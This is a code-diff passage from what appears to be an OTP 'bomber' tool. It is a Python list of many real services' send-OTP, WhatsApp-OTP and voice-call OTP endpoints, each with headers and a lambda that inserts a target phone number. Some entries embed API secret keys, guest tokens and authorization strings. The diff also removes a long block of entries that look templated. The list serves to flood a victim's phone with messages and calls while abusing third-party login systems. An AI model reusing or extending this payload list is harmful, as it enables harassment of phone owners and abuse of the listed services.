+        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
+        "method": "GET",
+        "headers": {
+            "User-Agent": "okhttp/3.9.1"
+        },
+        "data": None
+    },
+    {
+        "name": "rappi_mx",
+        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "okhttp/3.9.1"
+        },
+        "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
+    },
+    {
+        "name": "foxy_otp",
+        "url": "https://www.foxy.in/api/v2/users/send_otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
+            "Origin": "https://www.foxy.in"
+        },
+        "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'
+    },
+    {
+        "name": "foxy_wa",
+        "url": "https://www.foxy.in/api/v2/users/send_otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
+            "Origin": "https://www.foxy.in"
+        },
+        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
+    },
+    {
+        "name": "eka_care_init",
+        "url": "https://auth.eka.care/auth/init",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "okhttp/4.9.3",
+            "Device-Id": "5df83c463f0ff8ff"
+        },
+        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
+    },
+    {
+        "name": "smytten_new_device",
+        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://smytten.com"
+        },
+        "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'
+    },
+    {
+        "name": "wakefit_sms",
+        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.wakefit.co",
+            "API-Secret-Key": "ycq55IbIjkLb",
+            "API-Token": "c84d563b77441d784dce71323f69eb42"
+        },
+        "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'
+    },
+    {
+        "name": "caratlane_otp",
+        "url": "https://www.caratlane.com/cg/dhevudu",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.caratlane.com",
+            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
+        },
+        "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
+    },
+
     {
         "name": "zestmoney",
         "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
@@ -350,1061 +1120,6 @@ ULTIMATE_APIS = [
     {"name": "zepto_1", "url": "https://zepto.com/api/v3/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
     {"name": "zivame_1", "url": "https://zivame.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
     {"name": "zomato_1", "url": "https://zomato.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
-
-    # ═══════════════════════════════════════════════════════════
-    # 🆕 ADDED APIS FROM USER PROVIDED CODE
-    # ═══════════════════════════════════════════════════════════
-
-    # ─── From first code block (sync def send_otp_requests) ───
-    {
-        "name": "hungama_1",
-        "url": "https://communication.api.hungama.com/v1/communication/otp",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "identifier": "home",
-            "country_code": "IN"
-        },
-        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
-    },
-    {
-        "name": "merucab_1",
-        "url": "https://merucabapp.com/api/otp/generate",
-        "method": "POST",
-        "headers": {
-            "Mobilenumber": "{phone}",
-            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "okhttp/4.9.0"
-        },
-        "data": lambda p: f"mobile_number={p}"
-    },
-    {
-        "name": "dayco_1",
-        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://ekyc.daycoindia.com"
-        },
-        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
-    },
-    {
-        "name": "doubtnut_2",
-        "url": "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "headers": {
-            "version_code": "1160",
-            "has_upi": "false",
-            "device_model": "ASUS_I005DA",
-            "android_sdk_version": "28",
-            "content-type": "application/json; charset=utf-8",
-            "user-agent": "okhttp/5.0.0-alpha.2"
-        },
-        "data": lambda p: f'{{"app_version":"7.10.51","aaid":"538bd3a8-09c3-47fa-9141-6203f4c89450","course":"","phone_number":"{p}","language":"en","udid":"b751fb63c0ae17ba","class":"","gcm_reg_id":"eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"}}'
-    },
-    {
-        "name": "nobroker_1",
-        "url": "https://www.nobroker.in/api/v3/account/otp/send",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "origin": "https://www.nobroker.in",
-            "referer": "https://www.nobroker.in/"
-        },
-        "data": lambda p: f"phone={p}&countryCode=IN"
-    },
-    {
-        "name": "shiprocket_3",
-        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "authorization": "Bearer null",
-            "origin": "https://app.shiprocket.in",
-            "referer": "https://app.shiprocket.in/"
-        },
-        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
-    },
-    {
-        "name": "tatacapital_2",
-        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json"
-        },
-        "data": lambda p: f'{{"phone":"{p}","applSource":"","isOtpViaCallAtLogin":"true"}}'
-    },
-    {
-        "name": "penpencil_2",
-        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
-        "method": "POST",
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "user-agent": "okhttp/3.9.1"
-        },
-        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
-    },
-    {
-        "name": "1mg_2",
-        "url": "https://www.1mg.com/auth_api/v6/create_token",
-        "method": "POST",
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "user-agent": "okhttp/3.9.1"
-        },
-        "data": lambda p: f'{{"number":"{p}","is_corporate_user":false,"otp_on_call":true}}'
-    },
-    {
-        "name": "swiggy_call",
-        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
-        "method": "POST",
-        "headers": {
-            "user-agent": "Swiggy-Android",
-            "accept": "application/json; charset=utf-8",
-            "content-type": "application/json; charset=utf-8"
-        },
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    {
-        "name": "kpnfresh_web_2",
-        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
-        "method": "POST",
-        "headers": {
-            "x-channel-id": "WEB",
-            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/json",
-            "origin": "https://www.kpnfresh.com",
-            "referer": "https://www.kpnfresh.com/"
-        },
-        "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
-    },
-    {
-        "name": "servetel_2",
-        "url": "https://api.servetel.in/v1/auth/otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
-            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
-        },
-        "data": lambda p: f"mobile_number={p}"
-    },
-
-    # ─── From second code block (ULTIMATEAPIS) ───
-    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Myntra Call', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zepto Call', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Cred SMS', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Meesho Call', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
